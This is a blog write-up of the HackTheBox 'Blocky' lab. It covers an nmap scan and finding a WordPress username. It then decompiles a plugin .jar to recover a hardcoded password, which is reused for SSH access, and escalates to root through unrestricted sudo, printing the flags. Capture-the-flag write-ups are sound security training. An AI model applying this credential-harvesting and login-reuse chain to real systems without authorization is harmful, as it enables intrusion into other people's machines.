---
layout: post
title: HackTheBox - Blocky
date: 2020-12-22 00:17:00 +0100
tags: [HackTheBox]
image: /assets/img/htb/machines/linux/easy/blocky/Blocky.png 
---

## Foothold

### Nmap scan (open ports)

{% highlight bash %}
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Blocky-full-port-scan.txt 10.10.10.37
Nmap scan report for 10.10.10.37
Host is up (0.12s latency).
Not shown: 65530 filtered ports
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A
{% endhighlight %}

### Apache httpd 2.4.18  (port 80)

If we click on the first post on [http://10.10.10.37/](http://10.10.10.37/), we are redirected to a second page where we see a username (`notch`):

![notch](/assets/img/htb/machines/linux/easy/blocky/notch.png)

> Since it's a wordpess site we could also query [http://10.10.10.37/?author=1](http://10.10.10.37/?author=1).

With `dirb` we can discover some interesting directories:  

![dirb](/assets/img/htb/machines/linux/easy/blocky/dirb.png)

On [http://10.10.10.37/plugins/](http://10.10.10.37/plugins/) there are two `.jar` files:

![plugins](/assets/img/htb/machines/linux/easy/blocky/plugins.png)

**JAR** stands for **J**ava **A**rchive **D**ata. We can decompile these files with [`jd-gui`](http://java-decompiler.github.io/):

![jd-gui](/assets/img/htb/machines/linux/easy/blocky/jd-gui.png)

Is this a password?! Let's try to log in to SSH with username `notch` and the password we just found `8YsqfCTnvxAUeduzjNSXe22`

![shell](/assets/img/htb/machines/linux/easy/blocky/shell.png)

Bingo, we have a shell!

## User

{% highlight bash %}
notch@Blocky:~$ cat user.txt
59fee0977fb60b8a0bc6e41e751f3cd5
{% endhighlight %}

The first thing to check is: _in which groups is the user I just owned?_ 

{% highlight bash %}
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
{% endhighlight %}

As we can see, he's part of the `sudo` users. Let's see what we can run with `sudo`:

{% highlight bash %}
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
{% endhighlight %}

Everything! Are you serious notch?!

![are you serious gif](https://i.gifer.com/2yUm.gif)

## Root

{% highlight bash %}
notch@Blocky:~$ sudo su
root@Blocky:/home/notch# cd /root
root@Blocky:~# ls
root.txt
root@Blocky:~# cat root.txt
0a9694a5b4d272c694679f7860f1cd5f
{% endhighlight %}

___

# Useful links

- [Reconnoitre](https://github.com/codingo/Reconnoitre)
- [wpscan](https://github.com/wpscanteam/wpscan)
- [`jd-gui`: a Java decompiler](http://java-decompiler.github.io/)
- [Best practices for hardening sudo?](https://security.stackexchange.com/questions/135352/best-practices-for-hardening-sudo)
